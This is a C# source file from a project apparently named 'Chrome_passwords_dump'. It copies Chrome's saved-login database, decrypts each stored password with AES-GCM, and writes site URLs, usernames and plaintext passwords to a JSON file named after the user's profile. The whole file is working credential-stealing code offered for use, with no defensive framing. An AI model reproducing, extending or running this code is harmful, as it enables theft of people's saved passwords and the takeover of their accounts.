using Microsoft.Data.Sqlite;
using Newtonsoft.Json;
using SQLitePCL;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Chrome_passwords_dump
{
    internal class LoginData
    {
        private string Path;
        private byte[] Key;

        public LoginData(string path,byte[] aesKey)
        {
            this.Path = path;
            this.Key = aesKey;
            Fetch();
        }

        private static byte[] ObjectToByteArray(object obj)
        {
            if (obj == null)
                return null;

            BinaryFormatter formatter = new BinaryFormatter();
            using (MemoryStream stream = new MemoryStream())
            {
                formatter.Serialize(stream, obj);
                return stream.ToArray();
            }
        }

        private static string Decrypt(byte[] pass, byte[] key)
        {
            byte[] iv = new byte[12]; // initialize a new 12-byte IV
            Array.Copy(pass, 3, iv, 0, 12); // copy the IV from the password byte array

            byte[] ciphertext = new byte[pass.Length - 31];
            Array.Copy(pass, 15, ciphertext, 0, pass.Length - 31);

            byte[] tag = new byte[16];// initialize a new 16-byte authentication tag
            Array.Copy(pass, pass.Length - 16, tag, 0, 16); // copy the authentication tag from the end of the password byte array
 
            using AesGcm aesGcm = new AesGcm(key);
            byte[] decryptedData = new byte[ciphertext.Length]; // initialize a new byte array for the decrypted data
            aesGcm.Decrypt(iv, ciphertext, tag, decryptedData); // decrypt the ciphertext using the key, IV, and authentication tag

            return Encoding.UTF8.GetString(decryptedData);
        }


        public void Fetch()
        {
            Batteries.Init();
            const string tempFile = "temp.db";
            File.Copy(Path, tempFile, true);
            string final = "[";

            using (SqliteConnection connection = new SqliteConnection("Data Source=" + tempFile))
            {
                connection.Open();
                using (SqliteCommand command = new SqliteCommand("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used", connection))
                {
                    using (SqliteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string mainUrl = reader[0].ToString();
                            string loginUrl = reader[1].ToString();
                            string userName = reader[2].ToString();
                            byte[] encryptedPass = (byte[])reader[3];
                            string password = Decrypt(encryptedPass, Key);

                            var data = new
                            {
                                mainUrl = mainUrl,
                                loginUrl = loginUrl,
                                userName = userName,
                                password = password
                            };

                            string jsonData = JsonConvert.SerializeObject(data);
                            final += jsonData + ",";
                        }
                        reader.Close();
                    }
                }
                connection.Close();
                
                final = final.Substring(0, final.Length - 1) + "]";
                string[] parts = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile).Split("\\");
                string name = parts.Length >= 1 ? parts[parts.Length - 1] : "data";
                File.WriteAllText($"../{name}.json", final);
            }
        }
    }
}
